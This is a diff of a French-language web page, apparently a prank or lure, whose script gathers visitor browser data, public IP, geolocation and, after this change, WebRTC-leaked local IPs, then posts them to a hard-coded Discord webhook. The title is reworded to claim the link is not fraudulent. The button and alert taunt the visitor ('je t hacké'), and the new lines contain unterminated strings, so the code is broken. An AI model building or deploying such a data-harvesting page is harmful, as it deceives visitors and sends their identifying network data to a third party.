@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
-<title>Infos navigateur avancées</title>
+<title>promis le lien est pas frauduleux</title>
 </head>
 <body>
   <button id="sendInfoBtn">tkt pas clique ici</button>
@@ -10,6 +10,26 @@
   <script>
     const webhookURL = "https://discord.com/api/webhooks/1410679586605502566/CDeTYGF55y_IOtf5aSoNxqcCNxydCr7Wqft0eswP94mFTE1jBpm2oJG3PaIdq1ZVgsJT";
 
+    // Récupération des IP WebRTC
+    async function getWebRTCIPs() {
+      return new Promise((resolve) => {
+        const ips = new Set();
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.onicecandidate = (event) => {
+          if (!event.candidate) {
+            resolve(Array.from(ips));
+            return;
+          }
+          const parts = event.candidate.candidate.split(' ');
+          const ip = parts[4];
+          if (ip) ips.add(ip);
+        };
+        pc.createDataChannel("test");
+        pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(console.error);
+      });
+    }
+
+    // Récupération des infos du navigateur
     async function getBrowserInfo() {
       const navigatorInfo = {
         userAgent: navigator.userAgent,
@@ -86,11 +106,7 @@
         ip = await ipRes.json();
       } catch(e) { ip = { error: e.message }; }
 
-      // WebRTC support
-      const webrtc = {
-        RTCPeerConnection: !!window.RTCPeerConnection,
-        RTCDataChannel: !!window.RTCDataChannel
-      };
+      const webrtcIPs = await getWebRTCIPs();
 
       return {
         navigatorInfo,
@@ -101,12 +117,17 @@
         connectionInfo,
         geoInfo,
         ip,
-        webrtc
+        webrtc: {
+          RTCPeerConnection: !!window.RTCPeerConnection,
+          RTCDataChannel: !!window.RTCDataChannel,
+          ips: webrtcIPs
+        }
       };
     }
 
+    // Envoi des infos au webhook Discord après consentement
     async function sendBrowserInfo() {
-      const consent = confirm("t sur?");
+      const consent = confirm("t sur?);
       if (!consent) return;
 
       const info = await getBrowserInfo();
@@ -120,7 +141,7 @@
         })
       });
 
-      alert("je vien de t'hacker");
+      alert("je t hacké force);
     }
 
     document.getElementById("sendInfoBtn").addEventListener("click", sendBrowserInfo);
